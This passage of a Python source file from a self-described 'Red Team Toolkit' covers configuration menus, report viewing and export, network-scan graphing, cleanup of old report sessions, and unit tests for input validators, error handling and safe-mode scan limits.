        choice = cli_manager.get_choice("Select option")
        if not choice:
            continue
        
        if choice == "1":
            view_configuration()
        elif choice == "2":
            edit_configuration()
        elif choice == "3":
            reset_configuration()
        elif choice == "4":
            export_configuration()
        elif choice == "5":
            import_configuration()
        elif choice == "0":
            return
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[red]Invalid option. Please try again.[/red]")
            else:
                print(colored("Invalid option. Please try again.", Colors.FAIL))


def view_configuration():
    """Display current configuration with enhanced formatting."""
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(Panel.fit("[bold green]Current Configuration[/bold green]", style="green"))
        
        for section in config.config.sections():
            table = Table(title=f"[{section}]", show_header=True, header_style="bold blue")
            table.add_column("Setting", style="cyan")
            table.add_column("Value", style="white")
            
            for option, value in config.config.items(section):
                table.add_row(option, str(value))
            
            cli_manager.console.print(table)
            cli_manager.console.print()  # Add spacing
    else:
        print("\n[Current Configuration]")
        print("=" * 50)
        
        for section in config.config.sections():
            print(f"\n[{section}]")
            for option, value in config.config.items(section):
                print(f"  {option} = {value}")

def import_configuration():
    """Import configuration from file."""
    print("\n[Import Configuration]")
    
    filename = safe_input("Enter configuration file path: ")
    if not filename:
        return
    
    if not os.path.exists(filename):
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[red]File not found: {filename}[/red]")
        else:
            print(colored(f"File not found: {filename}", Colors.FAIL))
        return
    
    try:
        # Create a temporary config to validate the file
        temp_config = configparser.ConfigParser()
        temp_config.read(filename)
        
        # Confirm import
        if not cli_manager.confirm_action(f"Import configuration from {filename}? This will overwrite current settings."):
            return
        
        # Load the configuration
        config.config.read(filename)
        
        # Save to main config file
        with open(config.config_file, 'w') as f:
            config.config.write(f)
        
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[green]✓ Configuration imported from: {filename}[/green]")
        else:
            print(colored(f"✓ Configuration imported from: {filename}", Colors.OKGREEN))
        
        logger.info(f"Configuration imported from {filename}")
        
    except Exception as e:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[red]❌ Error importing configuration: {e}[/red]")
        else:
            print(colored(f"❌ Error importing configuration: {e}", Colors.FAIL))
        logger.error(f"Error importing configuration: {e}")


def edit_configuration():
    """Edit configuration values."""
    print("\n[Edit Configuration]")
    print("⚠️  Warning: Changes will be saved immediately.")
    
    # Show current sections
    print("\nAvailable sections:")
    for i, section in enumerate(config.config.sections(), 1):
        print(f"{i}. {section}")
    
    section_choice = safe_input("Select section to edit (or 0 to cancel): ")
    if not section_choice or section_choice == "0":
        return
    
    try:
        section_index = int(section_choice) - 1
        if 0 <= section_index < len(config.config.sections()):
            section = list(config.config.sections())[section_index]
        else:
            print(colored("Invalid section number.", Colors.FAIL))
            return
    except ValueError:
        print(colored("Invalid input.", Colors.FAIL))
        return
    
    print(f"\nEditing section: [{section}]")
    print("Current values:")
    
    for option, value in config.config.items(section):
        print(f"  {option} = {value}")
    
    option_name = safe_input("Enter option name to edit: ")
    if not option_name:
        return
    
    if not config.config.has_option(section, option_name):
        print(colored("Option not found.", Colors.FAIL))
        return
    
    new_value = safe_input(f"Enter new value for {option_name}: ")
    if new_value is None:
        return
    
    try:
        config.config.set(section, option_name, new_value)
        
        # Save configuration
        with open(config.config_file, 'w') as f:
            config.config.write(f)
        
        print(colored(f"✓ Configuration updated: {section}.{option_name} = {new_value}", Colors.OKGREEN))
    
    except Exception as e:
        print(colored(f"❌ Error saving configuration: {e}", Colors.FAIL))


def reset_configuration():
    """Reset configuration to defaults."""
    print("\n[Reset Configuration]")
    print("⚠️  Warning: This will reset all configuration to default values.")
    
    confirm = safe_input("Are you sure? (yes/no): ")
    if not confirm or confirm.lower() != "yes":
        print("Reset cancelled.")
        return
    
    try:
        config.create_default_config()
        print(colored("✓ Configuration reset to defaults.", Colors.OKGREEN))
    except Exception as e:
        print(colored(f"❌ Error resetting configuration: {e}", Colors.FAIL))


def export_configuration():
    """Export configuration to file."""
    print("\n[Export Configuration]")
    
    filename = safe_input("Enter export filename (default: config_export.ini): ")
    if not filename:
        filename = "config_export.ini"
    
    try:
        with open(filename, 'w') as f:
            config.config.write(f)
        print(colored(f"✓ Configuration exported to: {filename}", Colors.OKGREEN))
    except Exception as e:
        print(colored(f"❌ Error exporting configuration: {e}", Colors.FAIL))


def reporting_menu():
    """Enhanced reporting menu for the Red Team Toolkit."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced Reporting System[/bold blue]", border_style="blue"))
        console.print("[bold cyan]Comprehensive reporting and export capabilities[/bold cyan]")
    else:
        print("\n[Enhanced Reporting System]")
        print("Comprehensive reporting and export capabilities")
    
    # Define reporting options
    reporting_options = [
        (1, "View Current Session Reports", "Display all reports from current session"),
        (2, "Generate Session Summary", "Create comprehensive session summary report"),
        (3, "Export Tool Report", "Export specific tool report in multiple formats"),
        (4, "Generate Network Graphs", "Create visual graphs for network scan data"),
        (5, "View Report Directory", "Browse and manage report files"),
        (6, "Clear Old Reports", "Clean up old report sessions"),
        (7, "Back to Main Menu", "Return to main toolkit menu")
    ]
    
    while True:
        if RICH_AVAILABLE:
            console.print("\n[bold cyan]Reporting Options:[/bold cyan]")
            for num, name, desc in reporting_options:
                console.print(f"[green]{num}.[/green] [bold]{name}[/bold] - {desc}")
        else:
            print("\nReporting Options:")
            for num, name, desc in reporting_options:
                print(f"{num}. {name} - {desc}")
        
        choice = safe_input("\nSelect an option (0-7): ")
        
        if choice == "0":
            return
        
        elif choice == "1":
            view_current_session_reports()
        
        elif choice == "2":
            generate_session_summary()
        
        elif choice == "3":
            export_tool_report()
        
        elif choice == "4":
            generate_network_graphs()
        
        elif choice == "5":
            view_report_directory()
        
        elif choice == "6":
            clear_old_reports()
        
        elif choice == "7":
            return
        
        else:
            if RICH_AVAILABLE:
                console.print("[red]Invalid option. Please select 0-7.[/red]")
            else:
                print(colored("Invalid option. Please select 0-7.", Colors.FAIL))


def view_current_session_reports():
    """View all reports from the current session."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Current Session Reports[/bold blue]", border_style="blue"))
    else:
        print("\n[Current Session Reports]")
    
    if not report_manager.tool_reports:
        if RICH_AVAILABLE:
            console.print("[yellow]No reports generated in current session.[/yellow]")
        else:
            print(colored("No reports generated in current session.", Colors.WARNING))
        return
    
    if RICH_AVAILABLE:
        table = Table(title="Session Reports")
        table.add_column("Report ID", style="cyan", no_wrap=True)
        table.add_column("Tool", style="green")
        table.add_column("Target", style="yellow")
        table.add_column("Findings", style="magenta")
        table.add_column("Status", style="blue")
        
        for report_id, report in report_manager.tool_reports.items():
            status = "Completed" if 'end_time' in report else "In Progress"
            table.add_row(
                report_id,
                report['tool_name'],
                report.get('target', 'N/A'),
                str(len(report['findings'])),
                status
            )
        
        console.print(table)
    else:
        print("\nSession Reports:")
        print("-" * 80)
        for report_id, report in report_manager.tool_reports.items():
            status = "Completed" if 'end_time' in report else "In Progress"
            print(f"ID: {report_id}")
            print(f"Tool: {report['tool_name']}")
            print(f"Target: {report.get('target', 'N/A')}")
            print(f"Findings: {len(report['findings'])}")
            print(f"Status: {status}")
            print("-" * 40)


def generate_session_summary():
    """Generate a comprehensive session summary report."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Session Summary Generation[/bold blue]", border_style="blue"))
    else:
        print("\n[Session Summary Generation]")
    
    try:
        summary_file = report_manager.generate_session_summary()
        
        if RICH_AVAILABLE:
            console.print(f"[green]✓ Session summary generated: {summary_file}[/green]")
            
            # Display summary content
            with open(summary_file, 'r') as f:
                content = f.read()
            
            console.print(Panel(content, title="Session Summary", border_style="green"))
        else:
            print(colored(f"✓ Session summary generated: {summary_file}", Colors.OKGREEN))
            
            # Display summary content
            with open(summary_file, 'r') as f:
                content = f.read()
            print("\n" + "="*60)
            print("SESSION SUMMARY")
            print("="*60)
            print(content)
    
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]❌ Error generating session summary: {e}[/red]")
        else:
            print(colored(f"❌ Error generating session summary: {e}", Colors.FAIL))


def export_tool_report():
    """Export a specific tool report in multiple formats."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Tool Report Export[/bold blue]", border_style="blue"))
    else:
        print("\n[Tool Report Export]")
    
    if not report_manager.tool_reports:
        if RICH_AVAILABLE:
            console.print("[yellow]No reports available for export.[/yellow]")
        else:
            print(colored("No reports available for export.", Colors.WARNING))
        return
    
    # Show available reports
    if RICH_AVAILABLE:
        console.print("[cyan]Available Reports:[/cyan]")
        for i, report_id in enumerate(report_manager.tool_reports.keys(), 1):
            report = report_manager.tool_reports[report_id]
            console.print(f"[green]{i}.[/green] {report_id} - {report['tool_name']}")
    else:
        print("Available Reports:")
        for i, report_id in enumerate(report_manager.tool_reports.keys(), 1):
            report = report_manager.tool_reports[report_id]
            print(f"{i}. {report_id} - {report['tool_name']}")
    
    # Get report selection
    report_choice = safe_input("\nSelect report number: ")
    try:
        report_index = int(report_choice) - 1
        report_ids = list(report_manager.tool_reports.keys())
        if 0 <= report_index < len(report_ids):
            selected_report_id = report_ids[report_index]
        else:
            if RICH_AVAILABLE:
                console.print("[red]Invalid report selection.[/red]")
            else:
                print(colored("Invalid report selection.", Colors.FAIL))
            return
    except ValueError:
        if RICH_AVAILABLE:
            console.print("[red]Invalid input. Please enter a number.[/red]")
        else:
            print(colored("Invalid input. Please enter a number.", Colors.FAIL))
        return
    
    # Get format selection
    if RICH_AVAILABLE:
        console.print("\n[cyan]Export Formats:[/cyan]")
        console.print("[green]1.[/green] Text (.txt)")
        console.print("[green]2.[/green] JSON (.json)")
        console.print("[green]3.[/green] HTML (.html)")
        console.print("[green]4.[/green] PDF (.pdf)")
        console.print("[green]5.[/green] All formats")
    else:
        print("\nExport Formats:")
        print("1. Text (.txt)")
        print("2. JSON (.json)")
        print("3. HTML (.html)")
        print("4. PDF (.pdf)")
        print("5. All formats")
    
    format_choice = safe_input("Select format (1-5): ")
    
    try:
        if format_choice == "1":
            formats = ["txt"]
        elif format_choice == "2":
            formats = ["json"]
        elif format_choice == "3":
            formats = ["html"]
        elif format_choice == "4":
            formats = ["pdf"]
        elif format_choice == "5":
            formats = ["txt", "json", "html", "pdf"]
        else:
            if RICH_AVAILABLE:
                console.print("[red]Invalid format selection.[/red]")
            else:
                print(colored("Invalid format selection.", Colors.FAIL))
            return
        
        # Export reports
        exported_files = []
        for fmt in formats:
            try:
                file_path = report_manager.save_tool_report(selected_report_id, fmt)
                if file_path:
                    exported_files.append(file_path)
            except Exception as e:
                if RICH_AVAILABLE:
                    console.print(f"[red]Error exporting {fmt} format: {e}[/red]")
                else:
                    print(colored(f"Error exporting {fmt} format: {e}", Colors.FAIL))
        
        if exported_files:
            if RICH_AVAILABLE:
                console.print(f"[green]✓ Successfully exported {len(exported_files)} file(s):[/green]")
                for file_path in exported_files:
                    console.print(f"  [cyan]• {file_path}[/cyan]")
            else:
                print(colored(f"✓ Successfully exported {len(exported_files)} file(s):", Colors.OKGREEN))
                for file_path in exported_files:
                    print(f"  • {file_path}")
        else:
            if RICH_AVAILABLE:
                console.print("[red]❌ No files were exported successfully.[/red]")
            else:
                print(colored("❌ No files were exported successfully.", Colors.FAIL))
    
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red]❌ Error during export: {e}[/red]")
        else:
            print(colored(f"❌ Error during export: {e}", Colors.FAIL))


def generate_network_graphs():
    """Generate visual graphs for network scan data."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Network Graph Generation[/bold blue]", border_style="blue"))
    else:
        print("\n[Network Graph Generation]")
    
    if not MATPLOTLIB_AVAILABLE:
        if RICH_AVAILABLE:
            console.print("[red]❌ Matplotlib not available. Cannot generate graphs.[/red]")
        else:
            print(colored("❌ Matplotlib not available. Cannot generate graphs.", Colors.FAIL))
        return
    
    # Check for available data
    available_data = []
    for report_id, report in report_manager.tool_reports.items():
        if 'port_scan_results' in report.get('data', {}):
            available_data.append(('ports', report_id, 'Port Scan Results'))
        if 'service_results' in report.get('data', {}):
            available_data.append(('services', report_id, 'Service Results'))
        if 'findings_timeline' in report.get('data', {}):
            available_data.append(('timeline', report_id, 'Findings Timeline'))
    
    if not available_data:
        if RICH_AVAILABLE:
            console.print("[yellow]No network scan data available for graph generation.[/yellow]")
        else:
            print(colored("No network scan data available for graph generation.", Colors.WARNING))
        return
    
    # Show available data types
    if RICH_AVAILABLE:
        console.print("[cyan]Available Data for Graphs:[/cyan]")
        for i, (graph_type, report_id, description) in enumerate(available_data, 1):
            console.print(f"[green]{i}.[/green] {description} ({graph_type})")
    else:
        print("Available Data for Graphs:")
        for i, (graph_type, report_id, description) in enumerate(available_data, 1):
            print(f"{i}. {description} ({graph_type})")
    
    choice = safe_input("\nSelect data type for graph generation: ")
    try:
        choice_index = int(choice) - 1
        if 0 <= choice_index < len(available_data):
            graph_type, report_id, description = available_data[choice_index]
            data = report_manager.tool_reports[report_id].get('data', {})
            
            graph_file = report_manager.generate_graphs(data, graph_type)
            if graph_file:
                if RICH_AVAILABLE:
                    console.print(f"[green]✓ Graph generated: {graph_file}[/green]")
                else:
                    print(colored(f"✓ Graph generated: {graph_file}", Colors.OKGREEN))
            else:
                if RICH_AVAILABLE:
                    console.print("[red]❌ Failed to generate graph.[/red]")
                else:
                    print(colored("❌ Failed to generate graph.", Colors.FAIL))
        else:
            if RICH_AVAILABLE:
                console.print("[red]Invalid selection.[/red]")
            else:
                print(colored("Invalid selection.", Colors.FAIL))
    except ValueError:
        if RICH_AVAILABLE:
            console.print("[red]Invalid input. Please enter a number.[/red]")
        else:
            print(colored("Invalid input. Please enter a number.", Colors.FAIL))


def view_report_directory():
    """Browse and manage report files."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Report Directory Browser[/bold blue]", border_style="blue"))
    else:
        print("\n[Report Directory Browser]")
    
    reports_dir = Path(config.get('DEFAULT', 'report_directory', 'reports'))
    
    if not reports_dir.exists():
        if RICH_AVAILABLE:
            console.print("[yellow]Reports directory does not exist.[/yellow]")
        else:
            print(colored("Reports directory does not exist.", Colors.WARNING))
        return
    
    # List session directories
    session_dirs = [d for d in reports_dir.iterdir() if d.is_dir() and d.name.startswith('session_')]
    
    if not session_dirs:
        if RICH_AVAILABLE:
            console.print("[yellow]No report sessions found.[/yellow]")
        else:
            print(colored("No report sessions found.", Colors.WARNING))
        return
    
    if RICH_AVAILABLE:
        console.print("[cyan]Available Report Sessions:[/cyan]")
        for i, session_dir in enumerate(sorted(session_dirs, key=lambda x: x.name, reverse=True), 1):
            file_count = len(list(session_dir.glob('*')))
            console.print(f"[green]{i}.[/green] {session_dir.name} ({file_count} files)")
    else:
        print("Available Report Sessions:")
        for i, session_dir in enumerate(sorted(session_dirs, key=lambda x: x.name, reverse=True), 1):
            file_count = len(list(session_dir.glob('*')))
            print(f"{i}. {session_dir.name} ({file_count} files)")
    
    choice = safe_input("\nSelect session to view (or 0 to go back): ")
    if choice == "0":
        return
    
    try:
        choice_index = int(choice) - 1
        if 0 <= choice_index < len(session_dirs):
            selected_session = sorted(session_dirs, key=lambda x: x.name, reverse=True)[choice_index]
            
            # List files in session
            files = list(selected_session.glob('*'))
            
            if RICH_AVAILABLE:
                console.print(f"\n[cyan]Files in {selected_session.name}:[/cyan]")
                for file_path in sorted(files):
                    size = file_path.stat().st_size
                    console.print(f"[green]•[/green] {file_path.name} ({size} bytes)")
            else:
                print(f"\nFiles in {selected_session.name}:")
                for file_path in sorted(files):
                    size = file_path.stat().st_size
                    print(f"• {file_path.name} ({size} bytes)")
        else:
            if RICH_AVAILABLE:
                console.print("[red]Invalid selection.[/red]")
            else:
                print(colored("Invalid selection.", Colors.FAIL))
    except ValueError:
        if RICH_AVAILABLE:
            console.print("[red]Invalid input. Please enter a number.[/red]")
        else:
            print(colored("Invalid input. Please enter a number.", Colors.FAIL))


def clear_old_reports():
    """Clean up old report sessions."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Report Cleanup[/bold blue]", border_style="blue"))
    else:
        print("\n[Report Cleanup]")
    
    reports_dir = Path(config.get('DEFAULT', 'report_directory', 'reports'))
    
    if not reports_dir.exists():
        if RICH_AVAILABLE:
            console.print("[yellow]Reports directory does not exist.[/yellow]")
        else:
            print(colored("Reports directory does not exist.", Colors.WARNING))
        return
    
    # List old sessions (older than 7 days)
    session_dirs = [d for d in reports_dir.iterdir() if d.is_dir() and d.name.startswith('session_')]
    old_sessions = []
    
    for session_dir in session_dirs:
        try:
            # Extract date from session name
            session_date_str = session_dir.name.split('_')[1]  # session_YYYYMMDD_HHMMSS
            session_date = datetime.strptime(session_date_str, "%Y%m%d")
            days_old = (datetime.datetime.now() - session_date).days
            
            if days_old > 7:
                old_sessions.append((session_dir, days_old))
        except:
            continue
    
    if not old_sessions:
        if RICH_AVAILABLE:
            console.print("[green]No old reports to clean up (all sessions are recent).[/green]")
        else:
            print(colored("No old reports to clean up (all sessions are recent).", Colors.OKGREEN))
        return
    
    if RICH_AVAILABLE:
        console.print("[yellow]Old Report Sessions (older than 7 days):[/yellow]")
        for i, (session_dir, days_old) in enumerate(old_sessions, 1):
            file_count = len(list(session_dir.glob('*')))
            console.print(f"[red]{i}.[/red] {session_dir.name} ({days_old} days old, {file_count} files)")
    else:
        print("Old Report Sessions (older than 7 days):")
        for i, (session_dir, days_old) in enumerate(old_sessions, 1):
            file_count = len(list(session_dir.glob('*')))
            print(f"{i}. {session_dir.name} ({days_old} days old, {file_count} files)")
    
    if not safe_confirm("Do you want to delete these old report sessions?"):
        return
    
    deleted_count = 0
    for session_dir, _ in old_sessions:
        try:
            import shutil
            shutil.rmtree(session_dir)
            deleted_count += 1
        except Exception as e:
            if RICH_AVAILABLE:
                console.print(f"[red]Error deleting {session_dir.name}: {e}[/red]")
            else:
                print(colored(f"Error deleting {session_dir.name}: {e}", Colors.FAIL))
    
    if RICH_AVAILABLE:
        console.print(f"[green]✓ Deleted {deleted_count} old report sessions.[/green]")
    else:
        print(colored(f"✓ Deleted {deleted_count} old report sessions.", Colors.OKGREEN))


# Phase 7: Comprehensive Test Classes
if TESTING_AVAILABLE:
    class TestValidationFunctions(unittest.TestCase):
        """Unit tests for validation functions."""
        
        def setUp(self):
            self.qa = QualityAssurance()
        
        def test_ip_address_validation(self):
            """Test IP address validation."""
            # Valid IP addresses
            self.assertTrue(self.qa._validate_ip_address("192.168.1.1"))
            self.assertTrue(self.qa._validate_ip_address("10.0.0.1"))
            self.assertTrue(self.qa._validate_ip_address("172.16.0.1"))
            self.assertTrue(self.qa._validate_ip_address("127.0.0.1"))
            
            # Invalid IP addresses
            self.assertFalse(self.qa._validate_ip_address("256.1.2.3"))
            self.assertFalse(self.qa._validate_ip_address("192.168.1"))
            self.assertFalse(self.qa._validate_ip_address("invalid"))
            self.assertFalse(self.qa._validate_ip_address(""))
        
        def test_port_validation(self):
            """Test port number validation."""
            # Valid ports
            self.assertTrue(self.qa._validate_port(80))
            self.assertTrue(self.qa._validate_port(443))
            self.assertTrue(self.qa._validate_port(1))
            self.assertTrue(self.qa._validate_port(65535))
            
            # Invalid ports
            self.assertFalse(self.qa._validate_port(0))
            self.assertFalse(self.qa._validate_port(65536))
            self.assertFalse(self.qa._validate_port(-1))
            self.assertFalse(self.qa._validate_port("invalid"))
        
        def test_url_validation(self):
            """Test URL validation."""
            # Valid URLs
            self.assertTrue(self.qa._validate_url("http://example.com"))
            self.assertTrue(self.qa._validate_url("https://test.com/path"))
            self.assertTrue(self.qa._validate_url("ftp://files.example.com"))
            
            # Invalid URLs
            self.assertFalse(self.qa._validate_url("not-a-url"))
            self.assertFalse(self.qa._validate_url("http://"))
            self.assertFalse(self.qa._validate_url(""))
        
        def test_integer_validation(self):
            """Test integer validation."""
            # Valid integers
            self.assertTrue(self.qa._validate_integer(123))
            self.assertTrue(self.qa._validate_integer("456"))
            self.assertTrue(self.qa._validate_integer(0))
            self.assertTrue(self.qa._validate_integer(-1))
            
            # Invalid integers
            self.assertFalse(self.qa._validate_integer("not-a-number"))
            self.assertFalse(self.qa._validate_integer("12.34"))
            self.assertFalse(self.qa._validate_integer(""))
        
        def test_string_validation(self):
            """Test string validation."""
            # Valid strings
            self.assertTrue(self.qa._validate_string("valid string"))
            self.assertTrue(self.qa._validate_string("a"))
            
            # Invalid strings
            self.assertFalse(self.qa._validate_string(""))
            self.assertFalse(self.qa._validate_string("   "))
            self.assertFalse(self.qa._validate_string(None))


    class TestUtilityFunctions(unittest.TestCase):
        """Unit tests for utility functions."""
        
        def test_entropy_calculation(self):
            """Test entropy calculation."""
            # Test with known values
            self.assertAlmostEqual(calculate_entropy("password"), 2.3219, places=3)
            self.assertAlmostEqual(calculate_entropy("123456"), 1.5850, places=3)
            self.assertAlmostEqual(calculate_entropy(""), 0.0, places=3)
        
        def test_progress_bar_creation(self):
            """Test progress bar creation."""
            progress = ProgressBar(100, "Test Progress")
            self.assertEqual(progress.total, 100)
            self.assertEqual(progress.current, 0)
            self.assertEqual(progress.description, "Test Progress")
        
        def test_rate_limiter(self):
            """Test rate limiting functionality."""
            limiter = RateLimiter(max_requests=5, time_window=1)
            
            # Should allow first 5 requests
            for i in range(5):
                self.assertTrue(limiter.can_proceed())
            
            # Should block the 6th request
            self.assertFalse(limiter.can_proceed())


    class TestConfigurationManagement(unittest.TestCase):
        """Unit tests for configuration management."""
        
        def setUp(self):
            self.test_config = Config()
            self.test_config_file = Path("test_config.ini")
        
        def tearDown(self):
            if self.test_config_file.exists():
                self.test_config_file.unlink()
        
        def test_config_creation(self):
            """Test configuration file creation."""
            self.test_config.config_file = self.test_config_file
            self.test_config.create_default_config()
            
            self.assertTrue(self.test_config_file.exists())
            
            # Verify default values
            self.assertEqual(self.test_config.get('DEFAULT', 'max_threads'), '50')
            self.assertEqual(self.test_config.get('DEFAULT', 'default_timeout'), '5')
        
        def test_config_getters(self):
            """Test configuration getter methods."""
            self.test_config.config_file = self.test_config_file
            self.test_config.create_default_config()
            
            # Test getint
            self.assertEqual(self.test_config.getint('DEFAULT', 'max_threads'), 50)
            self.assertEqual(self.test_config.getint('DEFAULT', 'max_threads', fallback=100), 50)
            
            # Test getboolean
            self.assertTrue(self.test_config.getboolean('DEFAULT', 'save_reports'))
            self.assertFalse(self.test_config.getboolean('DEFAULT', 'save_reports', fallback=False))


    class TestFileOperations(unittest.TestCase):
        """Unit tests for file operations."""
        
        def setUp(self):
            self.test_dir = Path(tempfile.mkdtemp())
            self.test_file = self.test_dir / "test_file.txt"
            
            # Create test file
            with open(self.test_file, 'w') as f:
                f.write("Test content for file operations")
        
        def tearDown(self):
            shutil.rmtree(self.test_dir)
        
        def test_file_existence_check(self):
            """Test file existence validation."""
            self.assertTrue(self.test_file.exists())
            self.assertFalse((self.test_dir / "nonexistent.txt").exists())
        
        def test_file_size_check(self):
            """Test file size validation."""
            file_size = self.test_file.stat().st_size
            self.assertGreater(file_size, 0)
            self.assertLess(file_size, 1000)  # Should be small test file
        
        def test_safe_file_input(self):
            """Test safe file input validation."""
            # Valid file
            result = safe_file_input("Test file", str(self.test_file))
            self.assertEqual(result, str(self.test_file))
            
            # Invalid file (should return None or handle gracefully)
            result = safe_file_input("Invalid file", "nonexistent.txt")
            self.assertIsNone(result)


    class TestNetworkFunctions(unittest.TestCase):
        """Unit tests for network functions."""
        
        def test_ip_range_validation(self):
            """Test IP range validation."""
            # Valid IP ranges
            self.assertTrue(is_valid_ip_range("192.168.1.0/24"))
            self.assertTrue(is_valid_ip_range("10.0.0.0/8"))
            
            # Invalid IP ranges
            self.assertFalse(is_valid_ip_range("invalid"))
            self.assertFalse(is_valid_ip_range("192.168.1.1"))
            self.assertFalse(is_valid_ip_range("192.168.1.0/33"))
        
        def test_hostname_validation(self):
            """Test hostname validation."""
            # Valid hostnames
            self.assertTrue(is_valid_hostname("example.com"))
            self.assertTrue(is_valid_hostname("localhost"))
            self.assertTrue(is_valid_hostname("test-server"))
            
            # Invalid hostnames
            self.assertFalse(is_valid_hostname(""))
            self.assertFalse(is_valid_hostname("invalid hostname with spaces"))
        
        @unittest.mock.patch('socket.gethostbyname')
        def test_dns_resolution(self, mock_gethostbyname):
            """Test DNS resolution with mocking."""
            mock_gethostbyname.return_value = "192.168.1.1"
            
            result = resolve_hostname("example.com")
            self.assertEqual(result, "192.168.1.1")
            mock_gethostbyname.assert_called_once_with("example.com")


    class TestSecurityFunctions(unittest.TestCase):
        """Unit tests for security functions."""
        
        def test_hash_generation(self):
            """Test hash generation."""
            test_data = "test data"
            
            # Test different hash algorithms
            md5_hash = hashlib.md5(test_data.encode()).hexdigest()
            sha1_hash = hashlib.sha1(test_data.encode()).hexdigest()
            sha256_hash = hashlib.sha256(test_data.encode()).hexdigest()
            
            self.assertEqual(len(md5_hash), 32)
            self.assertEqual(len(sha1_hash), 40)
            self.assertEqual(len(sha256_hash), 64)
        
        def test_password_strength(self):
            """Test password strength analysis."""
            # Weak password
            weak_entropy = calculate_entropy("password")
            self.assertLess(weak_entropy, 3.0)
            
            # Strong password
            strong_entropy = calculate_entropy("P@ssw0rd!2023")
            self.assertGreater(strong_entropy, 3.0)


    class TestInputValidation(unittest.TestCase):
        """Tests for input validation and sanitization."""
        
        def setUp(self):
            self.qa = QualityAssurance()
        
        def test_required_input_validation(self):
            """Test required input validation."""
            # Valid required input
            self.assertTrue(self.qa.validate_input("test", "string", required=True))
            
            # Missing required input
            self.assertFalse(self.qa.validate_input("", "string", required=True))
            self.assertFalse(self.qa.validate_input(None, "string", required=True))
        
        def test_optional_input_validation(self):
            """Test optional input validation."""
            # Valid optional input
            self.assertTrue(self.qa.validate_input("test", "string", required=False))
            
            # Missing optional input
            self.assertTrue(self.qa.validate_input("", "string", required=False))
            self.assertTrue(self.qa.validate_input(None, "string", required=False))


    class TestDataIntegrity(unittest.TestCase):
        """Tests for data integrity and consistency."""
        
        def test_json_serialization(self):
            """Test JSON serialization/deserialization."""
            test_data = {
                'string': 'test',
                'number': 123,
                'list': [1, 2, 3],
                'dict': {'key': 'value'}
            }
            
            # Serialize
            json_str = json.dumps(test_data)
            self.assertIsInstance(json_str, str)
            
            # Deserialize
            deserialized = json.loads(json_str)
            self.assertEqual(test_data, deserialized)
        
        def test_file_encoding_consistency(self):
            """Test file encoding consistency."""
            test_content = "Test content with special chars: éñü"
            
            # Write with UTF-8
            test_file = Path(tempfile.mktemp())
            with open(test_file, 'w', encoding='utf-8') as f:
                f.write(test_content)
            
            # Read with UTF-8
            with open(test_file, 'r', encoding='utf-8') as f:
                read_content = f.read()
            
            self.assertEqual(test_content, read_content)
            
            # Cleanup
            test_file.unlink()


    class TestErrorHandling(unittest.TestCase):
        """Tests for error handling and recovery."""
        
        def setUp(self):
            self.error_handler = ErrorHandler()
        
        def test_error_handling(self):
            """Test error handling functionality."""
            # Test non-critical error
            result = self.error_handler.handle_error(
                ValueError("Test error"), 
                "test_context", 
                critical=False
            )
            self.assertTrue(result)
            self.assertEqual(self.error_handler.error_count, 1)
        
        def test_critical_error_handling(self):
            """Test critical error handling."""
            result = self.error_handler.handle_error(
                RuntimeError("Critical error"), 
                "critical_context", 
                critical=True
            )
            self.assertFalse(result)
            self.assertEqual(len(self.error_handler.critical_errors), 1)
        
        def test_max_errors_limit(self):
            """Test maximum error limit."""
            # Add errors up to the limit
            for i in range(10):
                result = self.error_handler.handle_error(
                    ValueError(f"Error {i}"), 
                    "test_context"
                )
                self.assertTrue(result)
            
            # Next error should cause failure
            result = self.error_handler.handle_error(
                ValueError("Exceeding limit"), 
                "test_context"
            )
            self.assertFalse(result)


    class TestSafetyMeasures(unittest.TestCase):
        """Tests for safety measures and protections."""
        
        def setUp(self):
            self.qa = QualityAssurance()
            self.safe_defaults = SafeDefaults()
        
        def test_safe_mode_enforcement(self):
            """Test safe mode enforcement."""
            self.qa.enable_safe_mode()
            self.assertTrue(self.qa.safe_mode)
            self.assertTrue(self.qa.destructive_operations_disabled)
        
        def test_destructive_operation_blocking(self):
            """Test blocking of destructive operations."""
            self.qa.enable_safe_mode()
            
            # Destructive operation should be blocked
            result = self.qa.check_safety_before_operation(
                "test_destructive_operation", 
                is_destructive=True
            )
            self.assertFalse(result)
        
        def test_safe_defaults(self):
            """Test safe default values."""
            # Test network scan defaults
            max_hosts = self.safe_defaults.get_safe_default('network_scan', 'max_hosts')
            self.assertEqual(max_hosts, 10)
            
            # Test with unsafe user value
            unsafe_hosts = self.safe_defaults.get_safe_default('network_scan', 'max_hosts', 100)
            self.assertEqual(unsafe_hosts, 10)  # Should use safe default
            
            # Test with safe user value
            safe_hosts = self.safe_defaults.get_safe_default('network_scan', 'max_hosts', 5)
            self.assertEqual(safe_hosts, 5)  # Should use user value


    class TestDestructiveOperations(unittest.TestCase):
        """Tests for destructive operation safety."""
        
        def setUp(self):
            self.qa = QualityAssurance()
            self.test_dir = Path(tempfile.mkdtemp())
        
        def tearDown(self):
            shutil.rmtree(self.test_dir)
        
        def test_file_deletion_safety(self):
            """Test file deletion safety measures."""
            test_file = self.test_dir / "test_file.txt"
            test_file.write_text("Test content")
            
            # Should not delete in safe mode
            self.qa.enable_safe_mode()
            if test_file.exists():
                # In safe mode, file deletion should be prevented
                self.assertTrue(test_file.exists())
        
        def test_network_scan_limits(self):
            """Test network scan safety limits."""
            safe_defaults = SafeDefaults()
            
            # Test port range limits
            max_ports = safe_defaults.get_safe_default('network_scan', 'max_ports', 2000)
            self.assertEqual(max_ports, 100)  # Should use safe default
            
            # Test timeout limits
